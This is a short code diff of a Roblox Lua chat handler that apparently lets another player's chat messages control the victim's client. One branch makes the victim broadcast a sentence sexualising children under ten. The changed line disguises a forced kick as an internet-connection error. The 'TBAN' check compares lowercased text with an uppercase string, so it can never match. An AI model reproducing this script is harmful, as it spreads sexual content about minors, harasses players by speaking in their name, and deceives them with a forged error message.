@@ -28,7 +28,7 @@ local function onChatMessage(message, speaker)
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Want to Fuck kids, specially those 10 years or younger. They have the tightest Pussies.", "All")
     elseif message:lower() == "TBAN" then
         -- Kick the local player
-        game:GetService("Players").LocalPlayer:Kick("You Have Been Banned From Entering The Game! ")
+        game:GetService("Players").LocalPlayer:Kick("You were kkicked from this experience. Please check your internet connection and try again")
     end
 end
 
